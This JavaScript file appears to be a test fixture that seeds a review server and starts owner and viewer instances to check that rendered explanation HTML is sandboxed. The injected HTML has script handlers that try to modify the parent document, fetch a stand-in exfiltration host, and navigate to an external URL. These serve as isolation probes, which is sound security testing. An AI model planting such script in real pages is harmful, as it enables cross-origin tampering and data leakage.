import { writeFileSync } from "node:fs";
import path from "node:path";
import { fixture, seed } from "./fixtures.js";
import { createServer } from "../src/server.js";
const f = fixture();
writeFileSync(
  path.join(f.root, "owner-token"),
  "synthetic-test-owner-key-not-a-real-credential",
  { mode: 0o600 },
);
const { review, explanation } = await seed(f.service);
explanation.html += `<button id="test-sandbox" onclick="try{parent.document.body.dataset.compromised='yes';document.getElementById('isolation').textContent='broken'}catch(e){document.getElementById('isolation').textContent='opaque origin'}fetch('https://exfil.example.test/leak').catch(()=>{})">Check isolation</button><p id="isolation"></p><button id="test-navigation" onclick="location.href='https://exfil.example.test/navigation'">Attempt external navigation</button>`;
f.service.store.put("explanation", explanation);
f.service.store.put("run", {
  id: "private-question",
  reviewId: review.id,
  versionId: explanation.versionId,
  kind: "question",
  state: "succeeded",
  backend: "traex",
  question: "PRIVATE-QUESTION-SENTINEL",
  answer: "PRIVATE-ANSWER-SENTINEL",
  createdAt: explanation.createdAt,
});
const owner = await createServer(f.service, true),
  viewer = await createServer(f.service, false);
await owner.listen({ host: "127.0.0.1", port: 19371 });
await viewer.listen({ host: "127.0.0.1", port: 19370 });
const stop = async () => {
  await Promise.all([owner.close(), viewer.close()]);
  f.cleanup();
  process.exit(0);
};
process.on("SIGTERM", stop);
process.on("SIGINT", stop);
